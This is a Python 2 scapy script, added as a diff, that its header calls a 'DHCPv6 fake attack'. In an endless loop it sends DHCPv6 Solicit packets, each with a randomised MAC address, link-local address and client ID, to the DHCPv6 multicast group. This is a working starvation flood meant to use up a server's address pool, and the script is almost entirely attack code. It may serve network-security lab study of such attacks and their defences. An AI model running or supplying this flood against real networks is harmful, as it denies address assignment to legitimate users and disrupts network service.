@@ -1,0 +1,100 @@
+# -*- coding: utf-8 -*-
+#! /usr/bin/env python
+# DHCPv6 fake attack
+# Date:     28/10/11
+# Author:   AJ NOURI (cciethebeginning.wordpress.com)
+
+
+from scapy.all import *
+from netaddr import *
+# or from netaddr.strategy.ipv6 import *
+import random
+import logging
+
+
+class randmac():
+    """ Generates two forms of random MAC address
+    and corresponding Link Local EUI-64 IPv6 address"""
+    def __init__(self):
+        """
+        Generates MAC address string by chunks of one byte
+        """
+        random.seed()
+        self.mac11 = str(hex(random.randint(0,255))[2:])
+        self.mac12 = str(hex(random.randint(0,255))[2:])
+        self.mac21 = str(hex(random.randint(0,255))[2:])
+        self.mac22 = str(hex(random.randint(0,255))[2:])
+        self.mac31 = str(hex(random.randint(0,255))[2:])
+        self.mac32 = str(hex(random.randint(0,255))[2:])
+
+    def form1b(self):
+        """ format 1 XX:XX:XX:XX:XX:XX"""
+        self.rez1 =  self.mac11 + ":" +   self.mac12 + ":" +  self.mac21 + ":" +  self.mac22 + ":" +  self.mac31 + ":" +  self.mac32
+        return self.rez1
+
+    def form2b(self):
+        """ format 2 XXXX.XXXX.XXXX"""    
+        self.rez2 =  self.mac11 +  self.mac12 + "." +  self.mac21 +   self.mac22 + "." +  self.mac31 +  self.mac32
+        return self.rez2
+
+    def eui64(self):   
+        """ Generates interface ID in EUI-64 format"""
+        self.rez3 =  self.mac11 +  self.mac12 + ":" + self.mac21 + "ff" + ":" + "fe" +  self.mac22 + ":" +  self.mac31 + self.mac32
+        return self.rez3
+
+    def ip6_ll_eui64(self):
+        """ Generates Link-local  IPv6 addres in EUI-64 format"""
+        self.ip6_ll_eui64 = "fe80" + "::" + self.eui64()
+        return self.ip6_ll_eui64
+
+
+def main():
+    
+    macs = randmac()
+    macsrc = macs.form1b()
+    ipv6llsrc = macs.ip6_ll_eui64()
+    ipv6udst = "2001:db8:5ab::1"
+    ipv6lldst = "fe80::c800:39ff:feb8:6"
+    macdst = "ca:00:39:b8:00:06"
+    ipv6usrc = "2001:db8:5ab::1"
+
+    l2 = Ether()
+    l3 = IPv6()
+    l4 = UDP()
+    sol = DHCP6_Solicit()
+    rc = DHCP6OptRapidCommit()
+    opreq = DHCP6OptOptReq()
+    et= DHCP6OptElapsedTime()
+    cid = DHCP6OptClientId()
+    iana = DHCP6OptIA_NA()
+    rc.optlen = 0
+    opreq.optlen = 4
+    iana.optlen = 12
+    iana.T1 = 0
+    iana.T2 = 0
+    cid.optlen = 10
+
+    l2.dst = macdst
+    l3.dst = "ff02::1:2"
+    l4.sport = 546
+    l4.dport = 547
+
+    #for i in range(1,100):
+    while(1 == 1):
+        try:
+            macs = randmac()
+            macsrc = macs.form1b()
+            ipv6llsrc = macs.ip6_ll_eui64()
+            print ipv6llsrc
+            l2.src = macsrc
+            l3.src = ipv6llsrc
+            random.seed()
+            sol.trid = random.randint(0,16777215)
+            cid.duid = ("00030001"+ str(EUI(macsrc)).replace("-","")).decode("hex")
+            pkt = l2/l3/l4/sol/iana/rc/et/cid/opreq
+            sendp(pkt, iface='eth1')
+        except KeyboardInterrupt:
+            print 'Program Interrupted by user'
+            break
+            
+if __name__=="__main__":main()
